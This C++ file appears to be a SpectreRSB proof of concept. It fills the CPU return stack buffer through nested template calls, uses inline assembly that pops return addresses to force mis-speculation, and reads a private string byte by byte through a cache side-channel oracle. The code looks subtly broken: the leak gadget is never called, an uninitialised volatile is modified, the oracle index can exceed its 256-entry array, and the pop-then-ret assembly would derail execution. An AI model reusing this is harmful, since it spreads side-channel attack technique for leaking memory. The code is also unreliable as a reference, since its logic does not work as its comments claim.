#include "cache_sidechannel.h"
#include "instr.h"
#include "utils.h"
#include <iostream>
#include <cstring>

constexpr size_t RSB_SIZE = 16;  // Typical Intel RSB size
const char *public_data = "xxxxxxxxxxxxxxxx";
const char *private_data = "It's a s3kr3t!!!";
CacheSideChannel sidechannel;

// Array of pointers used to uniquely identify speculative paths
const char *speculative_markers[RSB_SIZE] = {
    "Marker_0", "Marker_1", "Marker_2", "Marker_3",
    "Marker_4", "Marker_5", "Marker_6", "Marker_7",
    "Marker_8", "Marker_9", "Marker_10", "Marker_11",
    "Marker_12", "Marker_13", "Marker_14", "Marker_15"
};

void __attribute__((noinline)) gadget(size_t rsb_entry, char *secret_ptr, const std::array<BigByte,256> &oracle) {
    volatile char temp;
    // Use RSB_entry as part of leak (each gadget unique)
    temp &= oracle[*secret_ptr + rsb_entry * 16];
}

template<size_t DEPTH>
void __attribute__((noinline)) nested_call(char *secret_ptr, const std::array<BigByte,256> &oracle) {
    nested_call<DEPTH - 1>(secret_ptr, oracle);
    asm volatile("" ::: "memory"); // prevent optimization
}

template<>
void nested_call<0>(char *secret_ptr, const std::array<BigByte,256> &oracle) {
    // At deepest nesting level, manipulate stack and return speculatively
    asm volatile(
        "pop %%rax\n"         // remove current return addr
        "pop %%rax\n"         // mismatch software stack and RSB
        "ret\n"               // speculative execution from RSB occurs
        : : "D"(secret_ptr), "S"(oracle.data()) : "rax"
    );
}

char LeakByteRSB(size_t offset, size_t &used_rsb_entry) {
    const auto &oracle = sidechannel.GetOracle();
    
    for (int run = 0; ; ++run) {
        sidechannel.FlushOracle();
        
        // Fill entire RSB
        nested_call<RSB_SIZE>(const_cast<char*>(&private_data[offset]), oracle);

        // Identify which marker is leaked (infer used RSB entry)
        bool found = false;
        char leaked_char = 0;
        for (size_t entry = 0; entry < RSB_SIZE; ++entry) {
            auto result = sidechannel.RecomputeScores(
                public_data[offset] + entry * 16);
            if (result.first) {
                used_rsb_entry = entry;
                leaked_char = result.second - entry * 16;
                found = true;
                break;
            }
        }

        if (found) {
            return leaked_char;
        }

        if (run > 100000) {
            std::cerr << "Did not converge at offset " << offset << "\n";
            exit(EXIT_FAILURE);
        }
    }
}

int main() {
    std::cout << "SpectreRSB with full RSB usage tracking\n";

    size_t len = strlen(private_data);
    for (size_t i = 0; i < len; ++i) {
        size_t used_entry;
        char leaked = LeakByteRSB(i, used_entry);
        std::cout << leaked << "(RSB:" << used_entry << ") ";
        std::cout.flush();
    }
    std::cout << "\nDone!\n";
    return 0;
}
